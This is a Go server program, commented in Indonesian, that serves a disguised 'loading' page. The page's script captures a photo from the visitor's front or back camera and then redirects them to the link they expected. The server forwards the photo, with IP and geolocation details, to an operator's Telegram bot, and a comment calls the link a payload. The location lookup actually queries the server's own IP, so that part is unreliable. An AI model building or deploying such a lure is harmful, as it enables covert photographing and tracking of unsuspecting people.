package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"time"

	"github.com/joho/godotenv"
)

var botToken string
var chatID string
var ip2LocationToken string

type PhotoData struct {
	Image   string `json:"image"`
	UserID  string `json:"userId"`
	URLID   string `json:"urlId"`
	Camera  string `json:"camera"`
	Message string `json:"message"`
}

type LocationData struct {
	CountryCode string  `json:"country_code"`
	CountryName string  `json:"country_name"`
	RegionName  string  `json:"region_name"`
	CityName    string  `json:"city_name"`
	Latitude    float64 `json:"latitude"`
	Longitude   float64 `json:"longitude"`
	ASN         string  `json:"asn"` // Autonomous System Number
	AS          string  `json:"as"`  // Autonomous System
	IsProxy     bool    `json:"is_proxy"`
}

var scheme string

func serveLandingPage(w http.ResponseWriter, r *http.Request) {
	originalURL := r.URL.Query().Get("url")

	if originalURL == "" {
		http.Error(w, "URL tujuan tidak ditemukan", http.StatusBadRequest)
		return
	}

	htmlContent := fmt.Sprintf(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sedang Memuat...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f0f2f5; }
        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0%% { transform: rotate(0deg); } 100%% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h1>Memuat konten, harap tunggu...</h1>
    <p>Kami sedang mengalihkan Anda ke halaman yang diminta.</p>
    <script>
       // Skrip JavaScript akan diletakkan di sini.
        // Bagian ini akan meminta akses kamera dan mengirim data.
        const originalUrl = "%s";
        const userId = "%s";
        const urlId = "%s";

        // Fungsi untuk mengambil foto dari kamera.
        function capturePhotoAndRedirect() {
            // Meminta akses ke kamera depan ("user") atau belakang ("environment").
            const constraints = [
                { video: { facingMode: "user" } },
                { video: { facingMode: "environment" } }
            ];

            function attemptCapture(index) {
                if (index >= constraints.length) {
                    // Jika kedua kamera gagal, langsung redirect.
                    window.location.href = originalUrl;
                    return;
                }

                navigator.mediaDevices.getUserMedia(constraints[index])
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                                const photoData = canvas.toDataURL('image/jpeg', 0.8);

                                const cameraUsed = (index === 0) ? "front" : "back";
                                
                                // Panggil postPhoto dan tunggu hasilnya sebelum redirect
                                postPhoto(photoData, cameraUsed)
                                    .finally(() => {
                                        stream.getTracks().forEach(track => track.stop());
                                        window.location.href = originalUrl;
                                    });
                            }, 2000); // Tunggu sebentar untuk memastikan video siap.
                        };
                    })
                    .catch(err => {
                        console.error("Akses kamera gagal:", err);
                        // Coba kamera selanjutnya.
                        attemptCapture(index + 1);
                    });
            }

            // Fungsi untuk mengirim data foto ke server.
            function postPhoto(photoData, camera) {
                const payload = {
                    image: photoData,
                    userId: userId,
                    urlId: urlId,
                    camera: camera,
                    message: "Foto berhasil diambil."
                };

                return fetch('/upload-photo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log("Foto berhasil diunggah.");
                    } else {
                        console.error("Gagal mengunggah foto:", response.status);
                    }
                })
                .catch(error => {
                    console.error("Kesalahan saat mengunggah foto:", error);
                });
            }

            // Mulai proses pengambilan foto.
            attemptCapture(0);
        }

        // Jalankan fungsi setelah halaman dimuat.
        window.onload = capturePhotoAndRedirect;
    </script>
</body>
</html>
`, originalURL, chatID, originalURL)

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(htmlContent))
}

func getIPAndLocation() (string, *LocationData, error) {
	ipResp, err := http.Get("https://api.ipify.org/?format=json")
	if err != nil {
		return "", nil, fmt.Errorf("gagal mendapatkan IP publik: %w", err)
	}
	defer ipResp.Body.Close()

	var ipResult struct {
		IP string `json:"ip"`
	}
	if err := json.NewDecoder(ipResp.Body).Decode(&ipResult); err != nil {
		return "", nil, fmt.Errorf("gagal mendekode respons IP: %w", err)
	}

	ip := ipResult.IP

	locationResp, err := http.Get(fmt.Sprintf("https://api.ip2location.io/?key=%s&ip=%s", ip2LocationToken, ip))
	if err != nil {
		return ip, nil, fmt.Errorf("gagal mendapatkan data lokasi: %w", err)
	}
	defer locationResp.Body.Close()

	var locationData LocationData
	if err := json.NewDecoder(locationResp.Body).Decode(&locationData); err != nil {
		return ip, nil, fmt.Errorf("gagal mendekode respons lokasi: %w", err)
	}

	return ip, &locationData, nil
}

func uploadPhotoHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Metode HTTP tidak valid", http.StatusMethodNotAllowed)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Gagal membaca body request", http.StatusInternalServerError)
		return
	}

	var data PhotoData
	if err := json.Unmarshal(body, &data); err != nil {
		http.Error(w, "Format JSON tidak valid", http.StatusBadRequest)
		return
	}

	// Dapatkan IP dan data lokasi
	ip, location, err := getIPAndLocation()
	if err != nil {
		log.Printf("Gagal mendapatkan IP atau lokasi: %v", err)
		http.Error(w, "Gagal mendapatkan data lokasi", http.StatusInternalServerError)
		return
	}

	if r.URL.Scheme == "" {
		scheme = "http"
	} else {
		scheme = "https"
	}

	hostUrl := fmt.Sprintf("%s://%s/?url=%s", scheme, r.Host, data.URLID)
	mapsUrl := fmt.Sprintf("https://www.google.co.id/maps/place/%f,%f", location.Latitude, location.Longitude)

	// Dekode string base64 menjadi byte
	photoBytes, err := base64.StdEncoding.DecodeString(data.Image[len("data:image/jpeg;base64,"):])
	if err != nil {
		log.Printf("Gagal mendekode gambar base64: %v", err)
		http.Error(w, "Gagal mendekode gambar base64", http.StatusInternalServerError)
		return
	}

	message := fmt.Sprintf(
		"IP Address\t: %s\nFrom URL\t: %s\nURL Host\t: %s\n\nLocation\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\nMaps\t: %s\n\nNetwork\nAS/ISP Number\t: %s\nAS/ISP\t: %s\nIs Proxy\t: %t",
		ip,
		data.URLID,
		hostUrl,
		location.CountryCode,
		location.CountryName,
		location.RegionName,
		location.CityName,
		location.Latitude,
		location.Longitude,
		mapsUrl,
		location.ASN,
		location.AS,
		location.IsProxy,
	)

	if err := sendMessageToTelegram(message); err != nil {
		log.Printf("Gagal mengirim pesan ke Telegram: %v", err)
	}

	if err := sendPhotoToTelegram(photoBytes); err != nil {
		log.Printf("Gagal mengirim foto ke Telegram: %v", err)
	}

	log.Printf(
		"IP Address\t: %s\nFrom URL\t: %s\nURL Host\t: %s\n\nLocation\nCountry Code\t: %s\nCountry Name\t: %s\nRegion Name\t: %s\nCity Name\t: %s\nLatitude\t: %f\nLongitude\t: %f\nMaps\t: %s\n\nNetwork\nAS/ISP Number\t: %s\nAS/ISP\t: %s\nIs Proxy\t: %t",
		ip,
		data.URLID,
		hostUrl,
		location.CountryCode,
		location.CountryName,
		location.RegionName,
		location.CityName,
		location.Latitude,
		location.Longitude,
		mapsUrl,
		location.ASN,
		location.AS,
		location.IsProxy,
	)

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Foto berhasil diterima.")
}

func sendMessageToTelegram(message string) error {
	telegramAPIURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)
	writer.WriteField("text", message)

	writer.Close()

	req, err := http.NewRequest("POST", telegramAPIURL, body)
	if err != nil {
		return fmt.Errorf("gagal membuat permintaan HTTP: %w", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("gagal mengirim permintaan ke Telegram: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("gagal membaca respons dari Telegram: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("respons API Telegram gagal dengan status: %s, body: %s", resp.Status, respBody)
	}

	return nil
}

func sendPhotoToTelegram(photoBytes []byte) error {
	telegramAPIURL := "https://api.telegram.org/bot" + botToken + "/sendPhoto"

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatID)

	part, err := writer.CreateFormFile("photo", "user_photo.jpg")
	if err != nil {
		return fmt.Errorf("gagal membuat form file: %w", err)
	}

	_, err = io.Copy(part, bytes.NewReader(photoBytes))
	if err != nil {
		return fmt.Errorf("gagal menyalin data foto: %w", err)
	}

	writer.Close()

	req, err := http.NewRequest("POST", telegramAPIURL, body)
	if err != nil {
		return fmt.Errorf("gagal membuat permintaan HTTP: %w", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("gagal mengirim permintaan ke Telegram: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("gagal membaca respons dari Telegram: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("respons API Telegram gagal dengan status: %s, body: %s", resp.Status, respBody)
	}

	return nil
}

func main() {
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Gagal memuat file .env")
	}

	botToken = os.Getenv("botToken")
	chatID = os.Getenv("chatID")
	ip2LocationToken = os.Getenv("ip2LocationToken")

	if botToken == "" || chatID == "" || ip2LocationToken == "" {
		log.Fatal("Variabel botToken/chatID/ip2LocationToken tidak ditemukan di file .env")
	}

	// contoh payload: http://localhost:8080/?url=https://google.com
	http.HandleFunc("/", serveLandingPage)
	http.HandleFunc("/upload-photo", uploadPhotoHandler)

	log.Println("Server Golang berjalan di http://localhost:8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
